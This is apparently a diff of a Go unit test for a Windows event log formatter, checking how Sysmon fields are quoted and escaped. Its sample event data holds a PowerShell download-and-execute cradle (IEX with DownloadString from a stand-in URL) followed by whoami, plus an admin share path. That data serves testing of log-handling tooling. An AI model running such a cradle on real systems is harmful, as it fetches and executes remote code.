@@ -36,17 +36,20 @@ func TestFormatKeepsCommandLinesOnOneLineAndQuotable(t *testing.T) {
 		`<Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN01</Computer></System><EventData>` +
 		`<Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>` +
 		`<Data Name="CommandLine">powershell.exe -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://x/a')"&#13;&#10;whoami</Data>` +
-		`<Data Name="CurrentDirectory">C:\Temp\</Data><Data Name="Channel">shadowed</Data></EventData></Event>`
+		`<Data Name="CurrentDirectory">C:\Temp\</Data><Data Name="Share">\\fileserver\c$</Data>` +
+		`<Data Name="Defender Value">HKLM\Exclusions = 0x0</Data><Data Name="Channel">shadowed</Data></EventData></Event>`
 	got, err := winevent.FormatXML([]byte(xml))
 	if err != nil {
 		t.Fatal(err)
 	}
 	for _, part := range []string{
 		`EventID=1 Channel="Microsoft-Windows-Sysmon/Operational"`,
-		`CommandLine="powershell.exe -nop -c 'IEX (New-Object Net.WebClient).DownloadString('http://x/a')' whoami"`,
-		`Image="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"`,
+		`CommandLine="powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\" whoami"`,
+		`Image="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"`, // paths stay readable
 		`CurrentDirectory="C:\Temp\\"`, // trailing backslash can't escape the closing quote
-		`Data_Channel="shadowed"`,       // event data never overrides System fields
+		`Share="\\\fileserver\c$"`,     // a backslash before a backslash is doubled
+		`DefenderValue="HKLM\Exclusions = 0x0"`,
+		`Data_Channel="shadowed"`, // event data never overrides System fields
 	} {
 		if !strings.Contains(got, part) {
 			t.Errorf("missing %q in\n%s", part, got)
